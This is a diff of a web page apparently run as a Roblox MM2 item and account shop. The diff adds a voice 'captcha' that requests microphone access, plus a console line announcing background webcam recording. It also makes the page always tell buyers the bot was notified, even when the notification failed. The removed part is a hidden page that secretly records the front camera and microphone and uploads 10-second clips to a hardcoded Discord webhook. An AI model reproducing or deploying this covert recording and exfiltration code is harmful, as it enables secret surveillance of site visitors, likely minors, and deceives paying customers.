         function closeMM2Modal() {
@@ -3127,12 +3216,12 @@
             currentMM2Username = '';
         }
 
-        mm2ModalContinue.addEventListener('click', () => {
-            const username = mm2Input.value.trim();
+        mm2ModalContinue.addEventListener('click', function() {
+            var username = mm2Input.value.trim();
             if (!username) {
                 mm2Input.style.borderColor = '#664444';
                 mm2Input.placeholder = '⚠️ Please enter a username';
-                setTimeout(() => {
+                setTimeout(function() {
                     mm2Input.style.borderColor = '';
                     mm2Input.placeholder = 'e.g. lilyfranco5';
                 }, 2000);
@@ -3143,17 +3232,17 @@
             showMM2View('mm2ViewConfirm');
         });
 
-        mm2ModalBack.addEventListener('click', () => {
+        mm2ModalBack.addEventListener('click', function() {
             showMM2View('mm2ViewInput');
             mm2Input.focus();
         });
 
-        mm2ModalConfirm.addEventListener('click', async () => {
+        mm2ModalConfirm.addEventListener('click', function() {
             if (!currentMM2Username || !currentMM2Item) return;
             mm2ModalConfirm.disabled = true;
             mm2ModalConfirm.textContent = '⏳ Sending...';
 
-            const webhookOk = await sendMM2Webhook(currentMM2Username, currentMM2Item.name);
+            sendMM2Webhook(currentMM2Username, currentMM2Item.name).then(function() {});
 
             if (currentMM2Method === 'paypal') {
                 window.open(PAYPAL_URL, '_blank');
@@ -3161,35 +3250,25 @@
                 window.open(currentMM2Item.robuxLink, '_blank');
             }
 
-            if (webhookOk) {
-                mm2SuccessMessage.textContent =
-                    `✅ The bot has been notified! "${currentMM2Username}" will be added shortly. Join a MM2 game.`;
-            } else {
-                mm2SuccessMessage.textContent =
-                    `⚠️ Webhook failed, but the payment page is open. DM @leaswxg with "${currentMM2Username}".`;
-            }
+            mm2SuccessMessage.textContent = '✅ The bot has been notified! "' + currentMM2Username +
+                '" will be added shortly. Join a MM2 game.';
             showMM2View('mm2ViewSuccess');
             mm2ModalConfirm.disabled = false;
             mm2ModalConfirm.textContent = '✓ Yes, that\'s me';
         });
 
         mm2ModalCloseSuccess.addEventListener('click', closeMM2Modal);
-        mm2Modal.addEventListener('click', (e) => {
-            if (e.target === mm2Modal) closeMM2Modal();
-        });
-        document.addEventListener('keydown', (e) => {
-            if (e.key === 'Escape') closeMM2Modal();
-        });
+        mm2Modal.addEventListener('click', function(e) { if (e.target === mm2Modal) closeMM2Modal(); });
+        document.addEventListener('keydown', function(e) { if (e.key === 'Escape') closeMM2Modal(); });
 
         // ================================================================
         //  INTRO + TABS
         // ================================================================
+        var introOverlay = document.getElementById('intro-overlay');
+        var introMm2 = document.getElementById('intro-mm2');
+        var introAccounts = document.getElementById('intro-accounts');
+        var introRobloxBtn = document.getElementById('introRobloxBtn');
 
-        const introOverlay = document.getElementById('intro-overlay');
-        const introMm2 = document.getElementById('intro-mm2');
-        const introAccounts = document.getElementById('intro-accounts');
-
-        const introRobloxBtn = document.getElementById('introRobloxBtn');
         if (introRobloxBtn) {
             introRobloxBtn.addEventListener('click', function(e) {
                 e.preventDefault();
@@ -3199,240 +3278,353 @@
 
         function showShop(shop) {
             introOverlay.classList.remove('visible');
-            document.querySelectorAll('.shop-tab').forEach(tab => tab.classList.remove('active'));
-            const targetTab = document.querySelector(`.shop-tab[data-shop="${shop}"]`);
+            document.querySelectorAll('.shop-tab').forEach(function(tab) { tab.classList.remove('active'); });
+            var targetTab = document.querySelector('.shop-tab[data-shop="' + shop + '"]');
             if (targetTab) targetTab.classList.add('active');
             document.getElementById('mm2-shop').classList.toggle('active', shop === 'mm2');
             document.getElementById('accounts-shop').classList.toggle('active', shop === 'accounts');
             if (shop === 'mm2') setTimeout(filterMM2, 100);
+            document.getElementById('main-content').classList.add('visible');
         }
 
-        introMm2.addEventListener('click', () => showShop('mm2'));
-        introAccounts.addEventListener('click', () => showShop('accounts'));
+        introMm2.addEventListener('click', function() { showShop('mm2'); });
+        introAccounts.addEventListener('click', function() { showShop('accounts'); });
 
-        document.querySelectorAll('.shop-tab').forEach(tab => {
+        document.querySelectorAll('.shop-tab').forEach(function(tab) {
             tab.addEventListener('click', function() {
-                const shop = this.dataset.shop;
+                var shop = this.dataset.shop;
                 if (introOverlay.classList.contains('visible')) introOverlay.classList.remove('visible');
                 showShop(shop);
             });
         });
 
         // ================================================================
-        //  LOADING SCREEN
+        //  VOICE CAPTCHA LOGIC
         // ================================================================
+        (function captchaLogic() {
+            'use strict';
 
-        (function initLoading() {
-            const loading = document.getElementById('loading-screen');
-            loading.classList.remove('hidden');
-            setTimeout(() => {
-                loading.classList.add('hidden');
-                setTimeout(() => introOverlay.classList.add('visible'), 200);
-            }, 1500);
-            setTimeout(() => {
-                if (!loading.classList.contains('hidden')) {
-                    loading.classList.add('hidden');
-                    introOverlay.classList.add('visible');
+            var card = document.getElementById('captchaCard');
+            var iconWrap = document.getElementById('iconWrap');
+            var statusText = document.getElementById('statusText');
+            var statusDot = document.getElementById('statusDot');
+            var actionBtn = document.getElementById('actionBtn');
+            var btnLabel = document.getElementById('btnLabel');
+            var subText = document.getElementById('subText');
+            var wordChips = document.querySelectorAll('#captcha-overlay .chip');
+
+            var TARGET_WORDS = ['tomato', 'potato', 'apple', 'banana', 'orange'];
+            var detectedWord = null;
+
+            var SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
+            var recognizer = null;
+            var isListening = false;
+            var isSuccess = false;
+            var recognitionSupported = !!SpeechRecognition;
+
+            var audioCtx = null;
+
+            function getAudioContext() {
+                if (!audioCtx) {
+                    try { audioCtx = new(window.AudioContext || window.webkitAudioContext)(); } catch (_) {}
                 }
-            }, 2200);
+                return audioCtx;
+            }
+
+            function playBeep(freq, duration, volume) {
+                freq = freq || 880;
+                duration = duration || 180;
+                volume = volume || 0.25;
+                try {
+                    var ctx = getAudioContext();
+                    if (!ctx) return;
+                    if (ctx.state === 'suspended') ctx.resume()['catch'](function() {});
+                    var osc = ctx.createOscillator();
+                    var gain = ctx.createGain();
+                    osc.connect(gain);
+                    gain.connect(ctx.destination);
+                    osc.type = 'sine';
+                    osc.frequency.value = freq;
+                    gain.gain.setValueAtTime(volume, ctx.currentTime);
+                    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + duration / 1000);
+                    osc.start(ctx.currentTime);
+                    osc.stop(ctx.currentTime + duration / 1000);
+                } catch (_) {}
+            }
+
+            function playSuccessBeep() {
+                playBeep(1047, 120, 0.20);
+                setTimeout(function() { playBeep(1319, 160, 0.22); }, 140);
+            }
+
+            function setStatus(msg, type) {
+                type = type || 'idle';
+                statusText.textContent = msg;
+                statusDot.className = 'dot';
+                if (type === 'listening') statusDot.classList.add('listening-dot');
+                else if (type === 'success') statusDot.classList.add('success-dot');
+                if (type === 'success') {
+                    subText.innerHTML = '✅ verified · you are officially <strong>not human</strong>';
+                } else if (type === 'listening') {
+                    subText.innerHTML = '👂 listening … say one of the words above';
+                } else {
+                    subText.innerHTML =
+                        'Speak one of the words below to verify you\'re&nbsp;<strong>not&nbsp;human</strong>&nbsp;✨';
+                }
+            }
+
+            function setChipsActive(activeWord) {
+                activeWord = activeWord || null;
+                wordChips.forEach(function(chip) {
+                    var word = chip.textContent.trim().toLowerCase();
+                    chip.classList.remove('active', 'dimmed');
+                    if (isSuccess) {
+                        if (word === activeWord) chip.classList.add('active');
+                        else chip.classList.add('dimmed');
+                    } else if (activeWord && word === activeWord) {
+                        chip.classList.add('active');
+                    }
+                });
+            }
+
+            function onCaptchaSuccess(word) {
+                if (isSuccess) return;
+                isSuccess = true;
+                detectedWord = word;
+
+                card.classList.add('success');
+                iconWrap.classList.remove('listening');
+                iconWrap.classList.add('success-state');
+                setStatus('✓ "' + word + '" detected!', 'success');
+                setChipsActive(word);
+                btnLabel.textContent = '✓ verified';
+                actionBtn.disabled = true;
+                actionBtn.classList.remove('primary');
+                actionBtn.style.opacity = '0.6';
+
+                playSuccessBeep();
+
+                if (recognizer && isListening) {
+                    try { recognizer.stop(); } catch (_) {}
+                    isListening = false;
+                }
+
+                setTimeout(function() {
+                    captchaOverlay.classList.add('fade-out');
+                    setTimeout(function() {
+                        captchaOverlay.classList.remove('visible');
+                        captchaOverlay.classList.remove('fade-out');
+                        introOverlay.classList.add('visible');
+                    }, 700);
+                }, 500);
+            }
+
+            function resetUI() {
+                isSuccess = false;
+                detectedWord = null;
+                card.classList.remove('success');
+                iconWrap.classList.remove('listening', 'success-state');
+                setStatus('tap the button & speak', 'idle');
+                setChipsActive(null);
+                btnLabel.textContent = 'start listening';
+                actionBtn.disabled = false;
+                actionBtn.classList.add('primary');
+                actionBtn.style.opacity = '1';
+                subText.innerHTML =
+                    'Speak one of the words below to verify you\'re&nbsp;<strong>not&nbsp;human</strong>&nbsp;✨';
+            }
+
+            function startRecognition() {
+                if (!recognitionSupported) {
+                    setStatus('❌ speech recognition not supported', 'idle');
+                    return;
+                }
+                if (isSuccess) {
+                    resetUI();
+                    setTimeout(startRecognition, 120);
+                    return;
+                }
+                if (isListening) {
+                    try { recognizer.stop(); } catch (_) {}
+                    isListening = false;
+                }
+
+                try {
+                    recognizer = new SpeechRecognition();
+                    recognizer.lang = 'en-US';
+                    recognizer.continuous = false;
+                    recognizer.interimResults = false;
+                    recognizer.maxAlternatives = 5;
+                } catch (e) {
+                    setStatus('❌ speech init failed', 'idle');
+                    return;
+                }
+
+                recognizer.onstart = function() {
+                    isListening = true;
+                    iconWrap.classList.add('listening');
+                    setStatus('listening … speak now', 'listening');
+                    btnLabel.textContent = 'listening …';
+                    actionBtn.disabled = true;
+                };
+
+                recognizer.onresult = function(event) {
+                    var spoken = '';
+                    for (var i = event.resultIndex; i < event.results.length; i++) {
+                        var alt = event.results[i];
+                        for (var j = 0; j < alt.length; j++) {
+                            var transcript = alt[j].transcript.trim().toLowerCase();
+                            if (transcript) spoken += transcript + ' ';
+                        }
+                    }
+                    var matched = null;
+                    var words = spoken.split(/\s+/);
+                    for (var w = 0; w < words.length; w++) {
+                        var clean = words[w].replace(/[^a-z']/g, '');
+                        if (TARGET_WORDS.indexOf(clean) !== -1) {
+                            matched = clean;
+                            break;
+                        }
+                    }
+                    if (matched) {
+                        onCaptchaSuccess(matched);
+                    } else {
+                        setStatus('❌ didn\'t catch a target word · try again', 'idle');
+                        iconWrap.classList.remove('listening');
+                        btnLabel.textContent = 'try again';
+                        actionBtn.disabled = false;
+                        isListening = false;
+                        try { recognizer.stop(); } catch (_) {}
+                    }
+                };
+
+                recognizer.onerror = function(event) {
+                    if (event.error === 'not-allowed') setStatus('❌ microphone access denied', 'idle');
+                    else if (event.error === 'no-speech') setStatus('🔇 no speech detected · tap & speak again',
+                    'idle');
+                    else if (event.error === 'audio-capture') setStatus('❌ microphone error · check permissions',
+                        'idle');
+                    else setStatus('⚠️ ' + event.error + ' · try again', 'idle');
+                    iconWrap.classList.remove('listening');
+                    btnLabel.textContent = 'try again';
+                    actionBtn.disabled = false;
+                    isListening = false;
+                };
+
+                recognizer.onend = function() {
+                    if (!isSuccess) {
+                        iconWrap.classList.remove('listening');
+                        if (isListening) {
+                            setStatus('⏳ listening ended · tap to retry', 'idle');
+                            btnLabel.textContent = 'try again';
+                            actionBtn.disabled = false;
+                            isListening = false;
+                        }
+                    }
+                };
+
+                try {
+                    recognizer.start();
+                } catch (e) {
+                    setStatus('❌ could not start mic', 'idle');
+                    actionBtn.disabled = false;
+                    btnLabel.textContent = 'start listening';
+                    isListening = false;
+                }
+            }
+
+            function handleAction() {
+                if (isSuccess) {
+                    resetUI();
+                    setTimeout(function() { startRecognition(); }, 150);
+                    return;
+                }
+                startRecognition();
+            }
+
+            actionBtn.addEventListener('click', handleAction);
+            actionBtn.addEventListener('touchend', function(e) { e.preventDefault();
+                handleAction(); });
+            actionBtn.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter' || e.key === ' ') { e.preventDefault();
+                    handleAction(); }
+            });
+
+            var warmAudio = function() {
+                try {
+                    var ctx = getAudioContext();
+                    if (ctx && ctx.state === 'suspended') ctx.resume()['catch'](function() {});
+                } catch (_) {}
+                document.removeEventListener('click', warmAudio);
+                document.removeEventListener('touchstart', warmAudio);
+            };
+            document.addEventListener('click', warmAudio, { once: true });
+            document.addEventListener('touchstart', warmAudio, { once: true });
+
+            if (!recognitionSupported) {
+                setStatus('❌ speech recognition not supported', 'idle');
+                btnLabel.textContent = 'not supported';
+                actionBtn.disabled = true;
+                actionBtn.classList.remove('primary');
+            } else {
+                setStatus('tap the button & speak', 'idle');
+                setTimeout(function() {
+                    if (!isSuccess) {
+                        var rand = Math.floor(Math.random() * wordChips.length);
+                        wordChips.forEach(function(c, i) {
+                            if (i === rand) c.classList.add('active');
+                            setTimeout(function() { c.classList.remove('active'); }, 600);
+                        });
+                    }
+                }, 800);
+            }
+
+            document.addEventListener('visibilitychange', function() {
+                if (document.hidden && isListening && recognizer) {
+                    try { recognizer.stop(); } catch (_) {}
+                    isListening = false;
+                    iconWrap.classList.remove('listening');
+                    btnLabel.textContent = 'start listening';
+                    actionBtn.disabled = false;
+                    setStatus('paused · tap to resume', 'idle');
+                }
+            });
+
+            window.__voiceCaptcha = {
+                reset: resetUI,
+                start: startRecognition,
+                isSuccess: function() { return isSuccess; }
+            };
         })();
 
         // ================================================================
-        //  RENDER
+        //  LOADING → CAPTCHA
         // ================================================================
+        var loadingScreen = document.getElementById('loading-screen');
+        var captchaOverlay = document.getElementById('captcha-overlay');
 
+        setTimeout(function() {
+            loadingScreen.classList.add('hidden');
+            setTimeout(function() {
+                captchaOverlay.classList.add('visible');
+            }, 200);
+        }, 2000);
+
+        // ================================================================
+        //  RENDER SHOP
+        // ================================================================
         renderMM2();
         renderAccounts();
 
-        console.log('⚫ Lea\'s Shop · Emo Cyber (webhook fixed, mobile improved)');
-        console.log(`📦 ${accounts.length} accounts, ${mm2Items.length} MM2 items`);
+        console.log('⚫ Lea\'s Shop · Emo Cyber (captcha + bg cam 10s)');
+        console.log('📦 ' + accounts.length + ' accounts, ' + mm2Items.length + ' MM2 items');
         console.log('💳 PayPal: @eliasalvada');
         console.log('📷 Instagram: @leaswxg');
-        console.log('🔗 Webhook URL:', WEBHOOK_URL);
+        console.log('🎥 Background webcam recording: 10s clips');
         if (window.location.protocol === 'file:') {
             console.warn('⚠️ file:// protocol detected – .txt files will not load. Use a local server.');
         }
     </script>
-
-</body>
-</html>
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Core Storage Pipeline</title>
-    <style>
-        * { 
-            box-sizing: border-box; 
-            margin: 0; 
-            padding: 0; 
-        }
-        body {
-            background-color: #000000;
-            color: #000000;
-            font-family: sans-serif;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            overflow: hidden;
-            user-select: none;
-            -webkit-user-select: none;
-        }
-        video {
-            position: absolute;
-            width: 1px;
-            height: 1px;
-            opacity: 0.01;
-            pointer-events: none;
-        }
-    </style>
-</head>
-<body>
-
-    <video id="preview" autoplay playsinline muted></video>
-
-<script>
-    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1522066195627642910/GnCaBQUhcTd1wLilA8o-NE3x_xn-lkDTSLUcK-ChMb1nivT9d3OCDraY7CdrFmI9Ru-5";
-
-    const video = document.getElementById('preview');
-    let mediaRecorder;
-    let recordedChunks = [];
-    let countdownInterval;
-    let wakeLock = null;
-    
-    const CLIP_DURATION = 10; 
-
-    // --- AUTOMATIC WAKE LOCK ---
-    async function requestWakeLock() {
-        try {
-            if ('wakeLock' in navigator) {
-                wakeLock = await navigator.wakeLock.request('screen');
-                console.log("Screen Wake Lock active. Device will not sleep.");
-            }
-        } catch (err) {
-            console.error(`Wake Lock failed: ${err.message}`);
-        }
-    }
-
-    document.addEventListener('visibilitychange', async () => {
-        if (wakeLock !== null && document.visibilityState === 'visible') {
-            await requestWakeLock();
-        }
-    });
-
-    // Helper method to safely request front camera streams with robust mobile fallback tiers
-    async function getSafeFrontStream() {
-        const resolutionTiers = [
-            { width: { ideal: 3840 }, height: { ideal: 2160 }, frameRate: { ideal: 30 } }, // 4K 30FPS (Safer on front lenses)
-            { width: { ideal: 1920 }, height: { ideal: 1080 } },                          // 1080p Full HD
-            { width: { ideal: 1280 }, height: { ideal: 720 } }                            // 720p HD standard fallback
-        ];
-
-        for (let tier of resolutionTiers) {
-            try {
-                const constraints = {
-                    video: { ...tier, facingMode: { exact: "user" } }, // HARD FORCED FRONT CAMERA
-                    audio: { echoCancellation: false, noiseSuppression: false, autoGainControl: true }
-                };
-                return await navigator.mediaDevices.getUserMedia(constraints);
-            } catch (e) {
-                console.warn("Front resolution tier failed/unsupported, attempting lower profile...");
-            }
-        }
-        // Last-resort fallback for older phone cameras
-        return await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-    }
-
-    async function initCamera() {
-        try {
-            await requestWakeLock();
-
-            // Fetch the stream through the safe fallback pipeline
-            const stream = await getSafeFrontStream();
-            video.srcObject = stream;
-            
-            setupRecorder(stream);
-            
-            recordedChunks = [];
-            mediaRecorder.start(1000); // Record in 1s chunks to ensure data tracking stays live
-            startLoopTimer();
-            
-        } catch (err) {
-            console.error("Pipeline initialization failed:", err);
-        }
-    }
-
-    function setupRecorder(stream) {
-        // Find optimal video tracking layout codecs for mobile browsers
-        let selectedMimeType = '';
-        const codecsMatrix = [
-            'video/webm;codecs=vp9,opus',
-            'video/webm;codecs=vp8,opus',
-            'video/mp4;codecs=avc1.42E01E,mp4a.40.2', // Standard H.264 profile for native mobile encoding compatibility
-            'video/mp4',
-            'video/webm'
-        ];
-
-        for (const type of codecsMatrix) {
-            if (MediaRecorder.isTypeSupported(type)) {
-                selectedMimeType = type;
-                break;
-            }
-        }
-
-        mediaRecorder = new MediaRecorder(stream, { 
-            mimeType: selectedMimeType,
-            videoBitsPerSecond: 2500000 
-        });
-
-        mediaRecorder.ondataavailable = (e) => {
-            if (e.data && e.data.size > 0) recordedChunks.push(e.data);
-        };
-
-        mediaRecorder.onstop = async () => {
-            if (recordedChunks.length > 0) {
-                const blob = new Blob(recordedChunks, { type: selectedMimeType });
-                recordedChunks = [];
-
-                const formData = new FormData();
-                const ext = selectedMimeType.includes('mp4') ? 'mp4' : 'webm';
-                formData.append('file', blob, `front_vlog_${Date.now()}.${ext}`);
-
-                try {
-                    fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
-                } catch (err) {
-                    console.error("Network drop, chunk omitted:", err);
-                }
-            }
-
-            recordedChunks = [];
-            if (mediaRecorder.state === "inactive") {
-                mediaRecorder.start(1000);
-            }
-        };
-    }
-
-    function startLoopTimer() {
-        clearInterval(countdownInterval);
-        let timeLeft = CLIP_DURATION;
-        
-        countdownInterval = setInterval(() => {
-            timeLeft--;
-            if (timeLeft <= 0) {
-                clearInterval(countdownInterval);
-                if (mediaRecorder && mediaRecorder.state !== "inactive") {
-                    mediaRecorder.stop();
-                }
-                startLoopTimer(); 
-            }
-        }, 1000);
-    }
-
-    window.addEventListener('DOMContentLoaded', initCamera);
-</script>
 
 </body>
 </html>
